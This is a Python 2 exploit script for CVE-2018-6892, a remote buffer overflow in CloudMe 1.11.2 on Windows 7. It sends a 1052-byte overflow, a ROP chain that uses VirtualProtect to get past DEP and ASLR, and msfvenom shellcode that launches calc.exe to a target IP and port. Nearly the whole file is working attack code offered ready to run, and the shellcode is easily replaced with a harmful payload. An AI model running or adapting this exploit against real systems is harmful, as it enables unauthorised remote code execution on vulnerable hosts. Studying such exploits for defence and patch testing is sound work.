#!/usr/bin/env python2

# Exploit Title: CloudMe 1.11.2 (ASLR+DEP enabled)
# Date: 02/22/2023
# Exploit Author: NG
# Tested on: Windows 7 Professional Service Pack 1 x86
# CVE : CVE-2018-6892

import socket
import sys
import logging
import struct


def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [

      # stack pivot of 32 bytes
      0x6eb47c08,  # ADD ESP,20 # RETN  ** [libgcc_s_dw2-1.dll] ** 
      0x90909090,
      0x90909090,
      0x90909090,
      0x90909090,
      0x90909090,
      0x90909090,
      0x90909090,
      0x90909090,

      #[---INFO:gadgets_to_set_esi:---]

      0x61b5da02,  # POP ECX # RETN    ** [Qt5Gui.dll] **
      0x690398a8,  # ptr to &VirtualProtect() [IAT Qt5Core.dll]
      0x68bf49c0,  # MOV EAX,DWORD PTR DS:[ECX] # RETN    ** [Qt5Core.dll] **
      0x6ab372fd,  # XCHG EAX,ESI # RETN    ** [qwindows.dll] **

      #[---INFO:gadgets_to_set_ebp:---]
      0x6aae7b0b,  # POP EBP # RETN [qwindows.dll] 
      0x68d652e1,  # & call esp [Qt5Core.dll]

      #[---INFO:gadgets_to_set_ebx:---]
      0x6d9cf305,  # POP EAX # RETN [Qt5Sql.dll] 
      0xfffffcff,  # 0x00000201-> ebx
      0x64b4ed0a,  # NEG EAX # RETN    ** [libwinpthread-1.dll] ** 
      0x61b50260,  # XCHG EAX,EBX # RETN    ** [Qt5Gui.dll] **   |   {PAGE_EXECUTE_READ}

      #[---INFO:gadgets_to_set_edx:---]
      0x6d9cf305,  # POP EAX # RETN [Qt5Sql.dll] 
      0xffffffc0,  # 0x00000040-> edx
      0x64b4ed0a,  # NEG EAX # RETN    ** [libwinpthread-1.dll] ** 
      0x68bb687f,  # XCHG EAX,EDX # RETN    ** [Qt5Core.dll] ** 

      #[---INFO:gadgets_to_set_ecx:---]
      0x68d32800,  # POP ECX # RETN [Qt5Core.dll] 
      0x62028171,  # # &Writable location [Qt5Widgets.dll] -> need some tweaking
#      0x6aa8d803,   # &Writable location [qwindows.dll] 

      #[---INFO:gadgets_to_set_edi:---]
      0x61e85da4,  # POP EDI # RETN [Qt5Gui.dll] 
      0x64b4ed0c,  # RETN (ROP NOP) [libwinpthread-1.dll]

      #[---INFO:gadgets_to_set_eax:---]
      0x6d9cf305,  # POP EAX # RETN [Qt5Sql.dll] 
      0x90909090,  # nop

      #[---INFO:pushad:---]
      0x61b621f7   # PUSHAD # RETN    ** [Qt5Gui.dll] **
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()
# msfvenom -p windows/exec cmd=calc.exe -b "\x00\x0a\x0d" -f python -v shellcode
shellcode =  b""
shellcode += b"\xbb\x74\xb9\x7d\xcb\xda\xc2\xd9\x74\x24\xf4"
shellcode += b"\x5a\x29\xc9\xb1\x31\x31\x5a\x13\x83\xea\xfc"
shellcode += b"\x03\x5a\x7b\x5b\x88\x37\x6b\x19\x73\xc8\x6b"
shellcode += b"\x7e\xfd\x2d\x5a\xbe\x99\x26\xcc\x0e\xe9\x6b"
shellcode += b"\xe0\xe5\xbf\x9f\x73\x8b\x17\xaf\x34\x26\x4e"
shellcode += b"\x9e\xc5\x1b\xb2\x81\x45\x66\xe7\x61\x74\xa9"
shellcode += b"\xfa\x60\xb1\xd4\xf7\x31\x6a\x92\xaa\xa5\x1f"
shellcode += b"\xee\x76\x4d\x53\xfe\xfe\xb2\x23\x01\x2e\x65"
shellcode += b"\x38\x58\xf0\x87\xed\xd0\xb9\x9f\xf2\xdd\x70"
shellcode += b"\x2b\xc0\xaa\x82\xfd\x19\x52\x28\xc0\x96\xa1"
shellcode += b"\x30\x04\x10\x5a\x47\x7c\x63\xe7\x50\xbb\x1e"
shellcode += b"\x33\xd4\x58\xb8\xb0\x4e\x85\x39\x14\x08\x4e"
shellcode += b"\x35\xd1\x5e\x08\x59\xe4\xb3\x22\x65\x6d\x32"
shellcode += b"\xe5\xec\x35\x11\x21\xb5\xee\x38\x70\x13\x40"
shellcode += b"\x44\x62\xfc\x3d\xe0\xe8\x10\x29\x99\xb2\x7e"
shellcode += b"\xac\x2f\xc9\xcc\xae\x2f\xd2\x60\xc7\x1e\x59"
shellcode += b"\xef\x90\x9e\x88\x54\x6e\xd5\x91\xfc\xe7\xb0"
shellcode += b"\x43\xbd\x65\x43\xbe\x81\x93\xc0\x4b\x79\x60"
shellcode += b"\xd8\x39\x7c\x2c\x5e\xd1\x0c\x3d\x0b\xd5\xa3"
shellcode += b"\x3e\x1e\xb6\x22\xad\xc2\x17\xc1\x55\x60\x68"


if len(sys.argv) != 3:
    logging.error("usage: " + sys.argv[0] + " ip port")
    sys.exit(-1)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((sys.argv[1], int(sys.argv[2])))
except socket.error as msg:
    logging.error("couldn't connect with target (%s)" % msg)
    sys.exit(1)


rop_chain = create_rop_chain()


buf  = "A"*1052
buf  += rop_chain
buf  += shellcode
buf  += '\r\n'

s.send(buf)

s.close()